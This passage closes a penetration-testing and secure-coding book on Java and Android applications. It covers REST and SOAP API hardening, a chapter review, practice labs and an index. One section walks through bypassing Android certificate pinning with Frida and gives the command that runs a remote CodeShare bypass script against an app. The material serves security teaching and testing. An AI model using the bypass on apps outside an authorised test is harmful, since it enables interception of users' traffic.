Implementing access control is an important technique to minimize latency and reduce coupling between services. The REST endpoints should take access control decisions locally. The user authentication should be centralized in an Identity Provider (IDP) that issues access tokens. These can be JWT or API Keys. For detailed information on JWTs, please refer to [Chapter 9](#ch09.xhtml), Authentication Protocols. API keys are unique codes or tokens issued by web services or applications to authenticate and authorize the origin of API requests. These keys control access, enabling developers or applications to communicate with an API while ensuring security and monitoring usage. While API keys can reduce the impact of denial-of-service attacks, they are relatively easy to compromise when issued to third-party clients. It is vital to have a procedure for revocation of the API key in place to use if the client violates the usage agreement or if there is any compromise.

Exposing management endpoints via the Internet is not recommended. If necessary, it is essential to ensure that users use a strong authentication mechanism, such as multi-factor authentication. Exposing management endpoints via different HTTP ports or hosts is also recommended, preferably on a separate network interface card and restricted subnet. Access to these endpoints should be further restricted by firewall rules or the use of access control lists.

Error handling is also an important technique that should be used to respond with generic error messages and avoid revealing details of the failure unnecessarily. Technical information such as call stacks or other internal hints should not be passed to the client. It is also essential to write audit logs before and after security-related events. Token validation errors should be logged to detect attacks. Care should be taken when logging injection attacks by sanitizing log data beforehand.

Security headers and Cross Origin Resource Sharing (CORS) are also essential techniques that should be used to secure REST APIs. The server should always send the Content-Type header with the correct Content-Type; preferably, the Content-Type header should include a charset. Xframe options should be set to deny to protect against clickjacking. CORS allows us to disable the Same Origin Policy's security protection to make JavaScript calls to the REST service. It should be disabled if cross-domain calls are not supported. It is also important to be as specific as possible and as general as necessary when setting the origins of cross-domain calls.

Finally, sensitive information in HTTP requests should be carefully handled. In POST/PUT requests, sensitive data should be stored in the request body or headers. In GET requests, sensitive data should be shared in an HTTP header. It is essential to avoid passing API keys in URLs.

[SOAP APIs](#contents.xhtml_sc3_290a)

Securing SOAP APIs is a critical task that must be done carefully. Several steps should be taken to ensure the security of SOAP APIs, including:

1. The public availability of WSDL must be avoided.

2. User authentication must be done, and client certificate authentication using TLS is recommended.

3. The same encoding style must be enforced between the client and the server.

4. Authorization must be checked on every request, and access to administration and management functions within the web service application must be limited to Web service administrators.

Moreover, it is essential to validate SOAP payloads against their respective XML schema definition (XSD). All parameters that pass in and out of the web service must have a defined maximum length and character set. Strong validation patterns should be set for all fixed-format parameters. When validating XML input, it's essential to check for malformed XML entities, XML Bomb attacks, and external entity attacks. Output encoding is crucial for defending against XSS. To ensure virus protection, install virus scanning technology that updates the latest virus definitions and rules.

Also, message size should be limited to an appropriate size limit to avoid denial of service (DOS) attacks. Web services could be a target for DOS attacks by automatically sending thousands of large-size SOAP messages. Therefore, the SOAP message size should be limited to prevent a successful DOS attack. Taking all these precautions could help secure SOAP APIs and prevent them from becoming vulnerable to attacks.

The SOAP API’s messages need to support Confidentiality, Integrity, and Availability (CIA) to ensure the security of sensitive data. To maintain confidentiality, it is recommended to encrypt messages using strong cipher encryption and adequate key length to prevent brute-force attacks. Sensitive data must also be encrypted during transport and while at rest.

To ensure message integrity, TLS should be used for data in transit. If using public key cryptography for data at rest, encryption does not guarantee integrity or the sender's identity. XML digital signatures can supply message integrity using the sender's private key, and the recipient can validate the signature using the sender's digital certificate (public key).

Message throughput should be optimized for maximum throughput and protection against DoS attacks to maintain message availability. Protection against XML DoS attacks should also be implemented, including validation against recursive and oversized payloads, XML entity expansion, and overlong element names.

[Bypassing Certificate Pinning](#contents.xhtml_sc2_291a)

Certificate Pinning, also called SSL Pinning, is a security measure implemented in secure communication using the SSL/TLS protocol. It involves linking a specific digital certificate or public key with a web server or service to enhance the connection's authentication and security. The typical SSL/TLS procedure involves the client verifying the server's identity by confirming the server's digital certificate against a list of trusted certificates from Certificate Authorities (CAs). Although this method is effective, Certificate Pinning takes it further by explicitly specifying which certificates or public keys the client should consider valid for a particular server.

There are several methods for disabling SSL pinning, including:

*   Repackage the app and patch the SSL pinning function.
*   Another approach consists of using Magisk and the modules part of EdXposed, as detailed in the provided URL: [https://github.com/ElderDrivers/EdXposed](https://github.com/ElderDrivers/EdXposed).
*   You can use Frida to disable SSL pinning. In the following subsection, we will go through the steps to use Frida.

[Using Frida for bypassing SSL pinning](#contents.xhtml_sc3_292a)

Let us go through how to use Frida to bypass SSL pinning. Follow the given steps:

1. Verify that the Burp Suite proxy is in place and working for HTTP traffic following the instructions from earlier in this chapter.

2. Make sure Frida is installed and working, as seen in [Chapter 16](#ch16.xhtml),  Dynamic Analysis of Java Android Applications.

3. Find the most popular SSL bypass Frida script. You can look this up on Frida CodeShare, as shown in the following figure:

![](images/Figure_17.13.png)

Figure 17.13: Frida code share

The Universal Android SSL Pinning Bypass with Frida is the most popular.

4. Click on the link, and we are taken to the page with the script and the command to run the script without downloading it. Refer to the following figure:

![](images/Figure_17.14.png)

Figure 17.14: SSL pinning bypass code

5. Copy the command: frida  --codeshare  pcipolloni/universal-android-SSL-pinning-bypass-with-frida -f YOUR_BINARY.

6. All we need is the binary name to run this. We get that from Frida-ps. The list is pids with binary names.

7. Now, we can run Frida and bypass the SSL pinning on an application, as shown in the following figure:

![](images/Figure_17.15.png)

Figure 17.15: Running Frida

There are multiple ways to implement SSL pinning; this script may only work for some. If the first one does not work, search Frida codeshare for different scripts to try.

[Hardening SSL pinning](#contents.xhtml_sc3_293a)

SSL pinning is a security measure that clients can apply to enhance the security of their apps. However, it is essential to note that SSL pinning is a client-side control, which means that a reverse engineer will always be able to bypass it with enough time and skills. Additional security controls might be required to make it harder for attackers to bypass SSL pinning. For example, root detection, dynamic instrumentation detection, or APK manipulation can help make it more challenging for attackers to bypass SSL pinning.

[Conclusion](#contents.xhtml_sc2_294a)

In conclusion, this chapter has explored the details underpinning modern mobile development. With the ability to proxy network traffic, find API endpoints, and conduct thorough API endpoint testing, readers can now navigate the complex network landscape of Android applications with confidence and precision. As we wrap up this book, let us review what we have learned and then look at resources that we can use to continue our journey in Java Application penetration testing and secure development and coding.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [Appendix](#contents.xhtml_appa)

[Review](#contents.xhtml_sc2_295a)

In the previous chapters, we learned about Java security, secure coding, and penetration testing. [Chapter 1](#ch01.xhtml) provides an overview of penetration testing and the different types of testing. It also discusses the OWASP Top 10, a standard for web application security risks, and the principles of secure coding and design.

[Chapter 2](#ch02.xhtml) focuses on reconnaissance and mapping techniques for Java-based web applications. It also provides detailed insights into identifying technologies, discovering hidden content, and using various tools. Additionally, it discusses the significance of OSINT, social media, and search engine hacking in gathering valuable information for the testing process. It emphasizes the importance of collecting data through reconnaissance techniques to build a solid foundation for further penetration testing. [Chapter 3](#ch03.xhtml) discusses Burp Suite and OWASP Zap, the two most commonly used web application proxies, and walks through their basic configurations.

[Chapter 4](#ch04.xhtml) covers SQL injection, where malicious users fool an application into executing an unintended query. Injection points can be found by manually testing them with special characters. When found, the entire DB can be read/modified. Secure coding advice is given to avoid SQL injection. The chapter also describes preventing XSS attacks through encoding and validation. It touches on command injection and how to test for it.

[Chapters 5](#ch05.xhtml) to [8](#ch08.xhtml) of the book cover various web application security topics. [Chapter 5](#ch05.xhtml) deals with discovering vulnerabilities caused by misconfiguration or the use of default values. [Chapter 6](#ch06.xhtml) focuses on exploiting cross-origin requests (CORS) and provides secure coding guidance for client-side issues. [Chapter 7](#ch07.xhtml) explores the world of DOS attack vectors and offers techniques for testing for DOS safely. Next, [Chapter 8](#ch08.xhtml) discusses executing business logic vulnerabilities, providing step-by-step testing examples and secure code guidelines to recognize and address these vulnerabilities.

[Chapter 9](#ch09.xhtml) discusses authentication protocols, focusing on common vulnerabilities and attack vectors. The topics include username enumeration and vulnerabilities in login, logout, forgot password, and change password functionality. It discusses brute force attacks, including their exploitation and testing techniques. The chapter also outlines steps to identify correct and incorrect password guesses, such as analyzing HTTP responses and creating custom wordlists using tools like cewl.

[Chapter 10](#ch10.xhtml) explains cookie-based sessions and vulnerabilities like guessable session IDs, session fixation, session hijacking, and JSON Web Token vulnerabilities. This chapter also emphasizes the importance of secure session management, discussing security measures like secure cookie flags and the HTTPOnly cookie flag. The comprehensive testing protocol outlined includes verifying cookie flags, testing session ID generation and removal during login and logout, server-side invalidation, and assessing the entropy and integrity of session token values.

In [Chapter 11](#ch11.xhtml), "Authorization Practices," standard authorization testing is discussed, including missing function-level access control, insecure direct object reference (IDOR), privilege escalation, and cross-site request forgery (CSRF). This chapter emphasizes manual and automated testing methods to uncover vulnerabilities. It provides testing examples for IDOR and privilege escalation, including tool examples using Burp Suite’s Site Map Tool and the Autorize extension.

[Chapters 12](#ch12.xhtml), [13](#ch13.xhtml), and [14](#ch14.xhtml) in the book discuss advanced Java vulnerabilities involving serialization, Remote Method Invocation (RMI), and Java Native Interface (JNI), respectively. These chapters provide practical examples, coding guidance, and secure coding practices to help readers understand, find, and mitigate these vulnerabilities. The topics covered include serialization basics, manual exploitation, external server exploits, memory corruption, and more.

[Chapters 15](#ch15.xhtml)-[17](#ch17.xhtml) of this guide explore Java Android application security. [Chapter 15](#ch15.xhtml) covers static analysis, including tools for decompiling APK files and using MobSF. [Chapter 16](#ch16.xhtml) covers dynamic analysis and manual vulnerability exploitation using tools like MobSF and Frida. [Chapter 17](#ch17.xhtml) guides network analysis, covering proxying network traffic, finding API endpoints, API endpoint testing, and certificate pinning. It provides step-by-step instructions for each technique.

If you would like to practice more of the techniques in this book and learn new ones, some good places to start are with free online labs that allow practical experience:

*   Burp Suite Web Academy: [https://portswigger.net/web-security](https://portswigger.net/web-security)

    The web academy provided by Burp Suite is a practice for portswigger’s very reasonably priced certification.  All of the labs are web application vulnerability-related, and when you start one, you get your own instance of the lab to experiment and figure out.  All you need to connect to the instance is the URL provided by portswigger. The only tool you need is Burp Suite.

*   Try hack me free rooms of interest: Try hack me is a subscription service with some content that is available for free.  They have an easy-to-use platform for beginners, allowing a VPN connection to your instance of the room.  They also have an attack box that you can use to reach your instance so that you do not have to install your own tools.  The following rooms are web application-related and good for beginners.
*   [https://tryhackme.com/room/walkinganapplication](https://tryhackme.com/room/walkinganapplication)
*   [https://tryhackme.com/room/sqlilab](https://tryhackme.com/room/sqlilab)
*   [https://tryhackme.com/r/room/owasptop102021](https://tryhackme.com/r/room/owasptop102021)
*   [https://tryhackme.com/r/room/burpsuitebasics](https://tryhackme.com/r/room/burpsuitebasics)
*   [https://tryhackme.com/room/androidhacking101](https://tryhackme.com/room/androidhacking101)
*   [https://tryhackme.com/room/owasptop10](https://tryhackme.com/room/owasptop10)

# Index

Symbols

<!DOCTYPE> [84](#ch04.xhtml_page84)

<!ELEMENT> [84](#ch04.xhtml_page84)

<marquee> [71](#ch04.xhtml_page71)

<plaintext> [71](#ch04.xhtml_page71)

<script> [215](#ch10.xhtml_page215)

<ScRipT> [73](#ch04.xhtml_page73)

A

ADC, commands [333](#ch16.xhtml_page333)

Alternate Views [103](#ch05.xhtml_page103)

Android [312](#ch15.xhtml_page312)

Android Debug Bridge (ADB) [333](#ch16.xhtml_page333)-[335](#ch16.xhtml_page335)

Android Emulator, setting up [328](#ch16.xhtml_page328)-[332](#ch16.xhtml_page332)

Android, fundamentals

Activities [313](#ch15.xhtml_page313)

AndroidManifest.XML [313](#ch15.xhtml_page313)

Broadcast Receiver [314](#ch15.xhtml_page314)

Deep Links [314](#ch15.xhtml_page314)

Intents [313](#ch15.xhtml_page313)

Permissions [314](#ch15.xhtml_page314)

Services [315](#ch15.xhtml_page315)

WebViews [315](#ch15.xhtml_page315), [316](#ch15.xhtml_page316)

APIs, types

Rest APIs [361](#ch17.xhtml_page361), [362](#ch17.xhtml_page362)

SOAP APIs [362](#ch17.xhtml_page362), [363](#ch17.xhtml_page363)

API Testing [353](#ch17.xhtml_page353)

API Testing, architecture [358](#ch17.xhtml_page358)-[361](#ch17.xhtml_page361)

API Testing, aspects

API Definition, files [355](#ch17.xhtml_page355)

Endpoints [354](#ch17.xhtml_page354)

API Testing, procedure [356](#ch17.xhtml_page356), [357](#ch17.xhtml_page357)

APK File [316](#ch15.xhtml_page316)

APK File, section

APKTOOL [317](#ch15.xhtml_page317), [318](#ch15.xhtml_page318)

DEX2JAR [318](#ch15.xhtml_page318)

Arbitrary File Uploads [152](#ch08.xhtml_page152)

Arbitrary File Uploads, exploitation [153](#ch08.xhtml_page153)-[161](#ch08.xhtml_page161)

Arbitrary File Uploads, guidelines [161](#ch08.xhtml_page161), [162](#ch08.xhtml_page162)

Arbitrary File Uploads, ways [152](#ch08.xhtml_page152)

Authorization [222](#ch11.xhtml_page222)

Authorization, fundamental [222](#ch11.xhtml_page222), [223](#ch11.xhtml_page223)

Authorization, methods [223](#ch11.xhtml_page223)

B

Billion Laughs Attack [147](#ch07.xhtml_page147), [148](#ch07.xhtml_page148)

Black Box Testing [12](#ch01.xhtml_page12)

Black Box Testing, characteristics

emphasis, outcomes [13](#ch01.xhtml_page13)

less time, consuming [13](#ch01.xhtml_page13)

No Prior, information [13](#ch01.xhtml_page13)

realistic, assessment [13](#ch01.xhtml_page13)

real-world, simulating [13](#ch01.xhtml_page13)

user perspective [13](#ch01.xhtml_page13)

wide array [13](#ch01.xhtml_page13)

Brute Force Attacks [172](#ch09.xhtml_page172)

Brute Force Attacks, exploitation [172](#ch09.xhtml_page172)-[179](#ch09.xhtml_page179)

Brute Force Attacks, guidelines [179](#ch09.xhtml_page179)

Burp Extensions, installing [93](#ch05.xhtml_page93), [94](#ch05.xhtml_page94)

Burp Suite [34](#ch03.xhtml_page34)

Burp Suite fuzzing [62](#ch04.xhtml_page62), [63](#ch04.xhtml_page63)

Burp Suite, installing [34](#ch03.xhtml_page34)-[36](#ch03.xhtml_page36)

Burp Suite, process [38](#ch03.xhtml_page38)-[40](#ch03.xhtml_page40)

Burp Suite, setting up [36](#ch03.xhtml_page36)-[38](#ch03.xhtml_page38)

Burp Suite, uses [40](#ch03.xhtml_page40)-[47](#ch03.xhtml_page47)

Business-Specific Rules [165](#ch08.xhtml_page165)

Business-Specific Rules, architecture [165](#ch08.xhtml_page165)-[168](#ch08.xhtml_page168)

Business-Specific Rules, remediation [168](#ch08.xhtml_page168)

C

Change Password [197](#ch09.xhtml_page197)

Change Password Procedures, testing [198](#ch09.xhtml_page198)

Client-Side Code [116](#ch06.xhtml_page116)

Client-Side Code, guidelines [127](#ch06.xhtml_page127), [128](#ch06.xhtml_page128)

Client-Side Code, points

Bypassing [121](#ch06.xhtml_page121)-[123](#ch06.xhtml_page123)

Secrets [116](#ch06.xhtml_page116)

Secure Code, guidance [123](#ch06.xhtml_page123), [124](#ch06.xhtml_page124)

Client-Side Storage, mechanisms

LocalStorage [124](#ch06.xhtml_page124)

SessionStorage [124](#ch06.xhtml_page124)

Command Injection [82](#ch04.xhtml_page82), [83](#ch04.xhtml_page83)

Command Injection, characters [83](#ch04.xhtml_page83)

CORS [128](#ch06.xhtml_page128)

CORS, architectures [128](#ch06.xhtml_page128), [129](#ch06.xhtml_page129)

CORS, exploitation [130](#ch06.xhtml_page130)-[132](#ch06.xhtml_page132)

CORS, fundamentals [129](#ch06.xhtml_page129), [130](#ch06.xhtml_page130)

CORS, guidelines [132](#ch06.xhtml_page132), [133](#ch06.xhtml_page133)

CSRF [246](#ch11.xhtml_page246)

CSRF, architecture [246](#ch11.xhtml_page246), [247](#ch11.xhtml_page247)

CSRF, testing [246](#ch11.xhtml_page246)

CSRF, vulnerabilities

Cookie Defense [251](#ch11.xhtml_page251)

Encrypted Token Pattern [251](#ch11.xhtml_page251)

Synchronizer Token [251](#ch11.xhtml_page251)

CSRF With Burp Suite, optimizing [247](#ch11.xhtml_page247)-[250](#ch11.xhtml_page250)

D

Databases/Log Files, filling [142](#ch07.xhtml_page142)

Debug Views [113](#ch05.xhtml_page113)

Default Component, configuring [113](#ch05.xhtml_page113), [114](#ch05.xhtml_page114)

Deserialization [256](#ch12.xhtml_page256)

Deserialization, architecture [257](#ch12.xhtml_page257)-[260](#ch12.xhtml_page260)

Deserialization, guidance [273](#ch12.xhtml_page273)-[275](#ch12.xhtml_page275)

Deserialization, vulnerabilities [260](#ch12.xhtml_page260)-[262](#ch12.xhtml_page262)

Deserialization With Burp Suite, preventing [267](#ch12.xhtml_page267)-[272](#ch12.xhtml_page272)

Deserialization With Metasploit, optimizing [272](#ch12.xhtml_page272), [273](#ch12.xhtml_page273)

DEX2JAR, points

JADX-GUI [320](#ch15.xhtml_page320)

JD-GUI [319](#ch15.xhtml_page319)

Document Type Definitions (DTDs) [84](#ch04.xhtml_page84), [85](#ch04.xhtml_page85)

DoS Attacks [136](#ch07.xhtml_page136), [137](#ch07.xhtml_page137)

DoS Attacks, code guidance [142](#ch07.xhtml_page142)

DoS Attacks, steps [137](#ch07.xhtml_page137)-[142](#ch07.xhtml_page142)

Dynamic Analysis [343](#ch16.xhtml_page343)

E

Extensible Markup Language (XML) [146](#ch07.xhtml_page146)

F

FooBar [257](#ch12.xhtml_page257)

Forced Browse [50](#ch03.xhtml_page50)

Forgot Password [190](#ch09.xhtml_page190)

Forgot Password, assumptions [195](#ch09.xhtml_page195)

Forgot Password, vulnerabilities

Password, implementing [191](#ch09.xhtml_page191)-[197](#ch09.xhtml_page197)

Secure Code Advice [197](#ch09.xhtml_page197)

Testing [190](#ch09.xhtml_page190), [191](#ch09.xhtml_page191)

Frida [344](#ch16.xhtml_page344), [345](#ch16.xhtml_page345)

Frida, instructions [345](#ch16.xhtml_page345), [346](#ch16.xhtml_page346)

Frida, uses [345](#ch16.xhtml_page345)

Functional Analysis [31](#ch02.xhtml_page31)

G

Google Hacking [25](#ch02.xhtml_page25)

Google Hacking, queries [26](#ch02.xhtml_page26)

Google Hacking, sources

Bing [25](#ch02.xhtml_page25)

Google [25](#ch02.xhtml_page25)

Grey Box Testing [15](#ch01.xhtml_page15)

Grey Box Testing, characteristics

approach, balancing [16](#ch01.xhtml_page16)

efficiency, enhancing [16](#ch01.xhtml_page16)

focused, testing [16](#ch01.xhtml_page16)

partial, knowledge [16](#ch01.xhtml_page16)

perspective, insights [16](#ch01.xhtml_page16)

realistic, assessment [16](#ch01.xhtml_page16)

risk, prioritizing [16](#ch01.xhtml_page16)

vulnerabilities, identifying [16](#ch01.xhtml_page16)

Guessable Session IDs [201](#ch10.xhtml_page201)

Guessable Session IDs, optimizing [202](#ch10.xhtml_page202)

Guessable Session IDs, steps [203](#ch10.xhtml_page203)-[208](#ch10.xhtml_page208)

I

IDOR [232](#ch11.xhtml_page232), [233](#ch11.xhtml_page233)

IDOR, guidance [242](#ch11.xhtml_page242), [243](#ch11.xhtml_page243)

IDOR, testing [233](#ch11.xhtml_page233)-[238](#ch11.xhtml_page238)

IDOR With Burp Intruder, enumerating [238](#ch11.xhtml_page238)-[241](#ch11.xhtml_page241)

innerHTML [77](#ch04.xhtml_page77)

Input Validation [169](#ch08.xhtml_page169)

Input Validation, factors

character set [169](#ch08.xhtml_page169)

data types [169](#ch08.xhtml_page169)

duplicates [169](#ch08.xhtml_page169)

Legal Value (Enum) [169](#ch08.xhtml_page169)

Min/Max Length [169](#ch08.xhtml_page169)

Null [169](#ch08.xhtml_page169)

Numeric, range [169](#ch08.xhtml_page169)

parameter, requiring [169](#ch08.xhtml_page169)

specific patterns [169](#ch08.xhtml_page169)

J

JADX-GUI [320](#ch15.xhtml_page320), [321](#ch15.xhtml_page321)

Java [256](#ch12.xhtml_page256)

Java Deserialization Scanner [267](#ch12.xhtml_page267)

Java Native Interface (JNI) [296](#ch14.xhtml_page296)

JavaScript Library [100](#ch05.xhtml_page100)

JavaScript Library, utilizing [100](#ch05.xhtml_page100)-[102](#ch05.xhtml_page102)

JavaScript Library, ways [100](#ch05.xhtml_page100)

JD-GUI [319](#ch15.xhtml_page319)

JD-GUI, steps [319](#ch15.xhtml_page319), [320](#ch15.xhtml_page320)

JMX [289](#ch13.xhtml_page289)-[291](#ch13.xhtml_page291)

JNI, architecture [296](#ch14.xhtml_page296)-[299](#ch14.xhtml_page299)

JNI, implementing [308](#ch14.xhtml_page308), [309](#ch14.xhtml_page309)

JNI, vulnerabilities

Buffer Overflows [299](#ch14.xhtml_page299)-[302](#ch14.xhtml_page302)

Format String [303](#ch14.xhtml_page303)-[307](#ch14.xhtml_page307)

JSON Web Tokens (JWTs) [217](#ch10.xhtml_page217)

JWTs, architecture [218](#ch10.xhtml_page218), [219](#ch10.xhtml_page219)

JWTs, best practices [219](#ch10.xhtml_page219), [220](#ch10.xhtml_page220)

JWTs, creating steps [218](#ch10.xhtml_page218)

JWTs, verification steps [218](#ch10.xhtml_page218)

K

Known Vulnerable Components (KVC) [90](#ch05.xhtml_page90)

KVC, optimizing [91](#ch05.xhtml_page91)-[93](#ch05.xhtml_page93)

KVC, phase

Exploit-DB [90](#ch05.xhtml_page90)

Vulners [90](#ch05.xhtml_page90)

KVC, points

Burp Extensions [93](#ch05.xhtml_page93)

Constant, dependencies [97](#ch05.xhtml_page97)

Exploitation [96](#ch05.xhtml_page96), [97](#ch05.xhtml_page97)

L

LocalStorage/SessionStorage, comparing [125](#ch06.xhtml_page125), [126](#ch06.xhtml_page126)

Login Functionality [187](#ch09.xhtml_page187)

Login Functionality, vulnerabilities

Bypass/SQL Injection, comparing [188](#ch09.xhtml_page188), [189](#ch09.xhtml_page189)

Secure Code Advice [190](#ch09.xhtml_page190)

Testing [187](#ch09.xhtml_page187), [188](#ch09.xhtml_page188)

Logout Functionality, vulnerabilities [190](#ch09.xhtml_page190)

Long Queries/Wildcard Search [143](#ch07.xhtml_page143)

Long Queries/Wildcard Search, remediations [145](#ch07.xhtml_page145), [146](#ch07.xhtml_page146)

Long Queries/Wildcard Search, ways [143](#ch07.xhtml_page143)-[145](#ch07.xhtml_page145)

M

Manual Analysis [322](#ch15.xhtml_page322)-[324](#ch15.xhtml_page324)

Manual Dynamic Analysis [343](#ch16.xhtml_page343)

Manual Dynamic Analysis, ways [343](#ch16.xhtml_page343), [344](#ch16.xhtml_page344)

Mapping [27](#ch02.xhtml_page27)

Mapping, functionalities

Hidden Content, discovering [29](#ch02.xhtml_page29), [30](#ch02.xhtml_page30)

HTTP Request/Response Baseline [29](#ch02.xhtml_page29)

technologies, identifying [27](#ch02.xhtml_page27), [28](#ch02.xhtml_page28)

MFLAC [224](#ch11.xhtml_page224)

MFLAC, addressing [232](#ch11.xhtml_page232)

MFLAC, features

Authorize Extension [230](#ch11.xhtml_page230)-[232](#ch11.xhtml_page232)

Site Map Tool [224](#ch11.xhtml_page224)-[229](#ch11.xhtml_page229)

Mobile Security Framework (MobSF) [324](#ch15.xhtml_page324)

MobSF, architecture [324](#ch15.xhtml_page324)-[326](#ch15.xhtml_page326)

N

National Vulnerability Database (NVD) [97](#ch05.xhtml_page97)

O

OSINT Harvesting [22](#ch02.xhtml_page22)

OSINT Harvesting, methods

Breach Analysis [23](#ch02.xhtml_page23)

Contact Harvesting [22](#ch02.xhtml_page22), [23](#ch02.xhtml_page23)

OSINT Harvesting, sources

forum, analyzing [25](#ch02.xhtml_page25)

job, postings [24](#ch02.xhtml_page24)

technology, enumerators [24](#ch02.xhtml_page24)

OWASP [2](#ch01.xhtml_page2)

OWASP, initiatives

application, security [5](#ch01.xhtml_page5)

cheat sheets [4](#ch01.xhtml_page4)

documentation, guidelines [5](#ch01.xhtml_page5)

educational, resources [4](#ch01.xhtml_page4)

engagement, community [5](#ch01.xhtml_page5)

guides, testing [4](#ch01.xhtml_page4)

project, initiatives [4](#ch01.xhtml_page4)

web application security, testing [4](#ch01.xhtml_page4)

OWASP Mobile, challenges

Authentication/Authorization [337](#ch16.xhtml_page337)

improper credential [335](#ch16.xhtml_page335), [336](#ch16.xhtml_page336)

inadequate privacy, controlling [339](#ch16.xhtml_page339)

insecure, communicating [338](#ch16.xhtml_page338)

insecure data, storage [342](#ch16.xhtml_page342)

insufficient binary, protections [340](#ch16.xhtml_page340)

insufficient, cryptography [342](#ch16.xhtml_page342)

in sufficient input/output, validating [338](#ch16.xhtml_page338)

security, misconfiguring [340](#ch16.xhtml_page340)

supply chain vulnerabilities [336](#ch16.xhtml_page336)

OWASP, vulnerabilities [2](#ch01.xhtml_page2)-[4](#ch01.xhtml_page4)

OWASP ZAP [47](#ch03.xhtml_page47)-[51](#ch03.xhtml_page51)

P

Penetration Testing [9](#ch01.xhtml_page9)

Penetration Testing, methods

Exploitation [10](#ch01.xhtml_page10)

iteration, reporting [10](#ch01.xhtml_page10), [11](#ch01.xhtml_page11)

Mapping [10](#ch01.xhtml_page10)

Reconnaissance [10](#ch01.xhtml_page10)

Vulnerability, discovery [10](#ch01.xhtml_page10)

Penetration Testing, tools

custom, scripts [12](#ch01.xhtml_page12)

exploit [11](#ch01.xhtml_page11)

Port Scanners [11](#ch01.xhtml_page11)

Proof-of-Concept (PoC) [12](#ch01.xhtml_page12)

scanners, vulnerability [11](#ch01.xhtml_page11)

Web Proxies [11](#ch01.xhtml_page11)

Privilege Escalation [243](#ch11.xhtml_page243), [244](#ch11.xhtml_page244)

Privilege Escalation, architecture [244](#ch11.xhtml_page244), [245](#ch11.xhtml_page245)

Privilege Escalation, tips [245](#ch11.xhtml_page245)

Proxying [350](#ch17.xhtml_page350)

Proxying, steps [350](#ch17.xhtml_page350)-[353](#ch17.xhtml_page353)

R

Reconnaissance [18](#ch02.xhtml_page18)

Reconnaissance, aspects

OSINT, harvesting [19](#ch02.xhtml_page19)

search engine, hacking [19](#ch02.xhtml_page19)

targets, validating [19](#ch02.xhtml_page19)

Reconnaissance, essential

Google Hacking [25](#ch02.xhtml_page25)-[27](#ch02.xhtml_page27)

OSINT Harvesting [22](#ch02.xhtml_page22)

target, validating [19](#ch02.xhtml_page19)

Reconnaissance, list

code snippets, collecting [18](#ch02.xhtml_page18)

employees lists, compiling [18](#ch02.xhtml_page18)

information, uncovering [18](#ch02.xhtml_page18)

password information, identifying [18](#ch02.xhtml_page18)

targets, selecting [18](#ch02.xhtml_page18)

technologies, configuring [18](#ch02.xhtml_page18)

trust relationship, exploring [18](#ch02.xhtml_page18)

Remote Method Guesser (RMG) [284](#ch13.xhtml_page284)-[287](#ch13.xhtml_page287)

Remote Method Invocation (RMI) [278](#ch13.xhtml_page278)

RMI Enumeration [283](#ch13.xhtml_page283), [284](#ch13.xhtml_page284)

RMI, guidance [294](#ch13.xhtml_page294)

RMI, vulnerability

Java, configuring [278](#ch13.xhtml_page278)-[281](#ch13.xhtml_page281)

Manual Exploitation [281](#ch13.xhtml_page281)-[283](#ch13.xhtml_page283)

RMI With RMG, exploitation [287](#ch13.xhtml_page287)-[289](#ch13.xhtml_page289)

S

SDLC, phases

deployment [6](#ch01.xhtml_page6)

design [5](#ch01.xhtml_page5)

development [6](#ch01.xhtml_page6)

maintenance [6](#ch01.xhtml_page6)

requirements [5](#ch01.xhtml_page5)

testing [6](#ch01.xhtml_page6)

Secrets, configuring steps [116](#ch06.xhtml_page116)-[120](#ch06.xhtml_page120)

Secure Code, tools

GitLeaks [123](#ch06.xhtml_page123)

GitleaksJS [124](#ch06.xhtml_page124)

TruffleHog [123](#ch06.xhtml_page123)

Secure Coding [7](#ch01.xhtml_page7)

Secure Coding, guidelines [7](#ch01.xhtml_page7)-[9](#ch01.xhtml_page9)

Secure Design [6](#ch01.xhtml_page6)

Secure Design, principles [6](#ch01.xhtml_page6), [7](#ch01.xhtml_page7)

Secure Software Development Lifecycle (SDLC) [5](#ch01.xhtml_page5)

Sequential Process [162](#ch08.xhtml_page162), [163](#ch08.xhtml_page163)

Sequential Process, flows [165](#ch08.xhtml_page165)

Sequential Process, steps [163](#ch08.xhtml_page163)-[165](#ch08.xhtml_page165)

Sequential Process, testing [163](#ch08.xhtml_page163)

Serialization [256](#ch12.xhtml_page256)

Server-Side Request Forgery (SSRF) [251](#ch11.xhtml_page251), [252](#ch11.xhtml_page252)

Session Fixation [208](#ch10.xhtml_page208), [209](#ch10.xhtml_page209)

Session Fixation, steps [209](#ch10.xhtml_page209)-[212](#ch10.xhtml_page212)

Session Fixation, testing [209](#ch10.xhtml_page209)

Session Hijacking [212](#ch10.xhtml_page212)

Session Hijacking, Exploitation [212](#ch10.xhtml_page212)-[216](#ch10.xhtml_page216)

Session Management [200](#ch10.xhtml_page200)

Session Management, guidelines [201](#ch10.xhtml_page201)

Session Management, key steps [200](#ch10.xhtml_page200), [201](#ch10.xhtml_page201)

Simple Manual, testing [55](#ch04.xhtml_page55)-[59](#ch04.xhtml_page59)

Snyk [98](#ch05.xhtml_page98)

Snyk, containers [99](#ch05.xhtml_page99)

Snyk, steps [98](#ch05.xhtml_page98), [99](#ch05.xhtml_page99)

Software Vulnerability Scanner [102](#ch05.xhtml_page102)

Software Vulnerability Scanner, steps [103](#ch05.xhtml_page103)

SQL Injection [54](#ch04.xhtml_page54)

SQL Injection, characters [55](#ch04.xhtml_page55)

SQL Injection, extracting [60](#ch04.xhtml_page60)-[62](#ch04.xhtml_page62)

SQL Injection, practices [68](#ch04.xhtml_page68)-[70](#ch04.xhtml_page70)

SQL Injection, techniques [54](#ch04.xhtml_page54), [55](#ch04.xhtml_page55)

SQL Injection, tools

Burp Suite Fuzzing [62](#ch04.xhtml_page62)-[66](#ch04.xhtml_page66)

SQLMAP [66](#ch04.xhtml_page66)-[68](#ch04.xhtml_page68)

SQL Injection/User Agent, comparing [108](#ch05.xhtml_page108)-[113](#ch05.xhtml_page113)

SQLMAP [66](#ch04.xhtml_page66)-[68](#ch04.xhtml_page68)

SSL Pinning [363](#ch17.xhtml_page363)

SSL Pinning, methods [364](#ch17.xhtml_page364)

SSL Pinning, steps [364](#ch17.xhtml_page364)-[366](#ch17.xhtml_page366)

SSRF Bypass, techniques [252](#ch11.xhtml_page252)

SSRFs [291](#ch13.xhtml_page291), [292](#ch13.xhtml_page292)

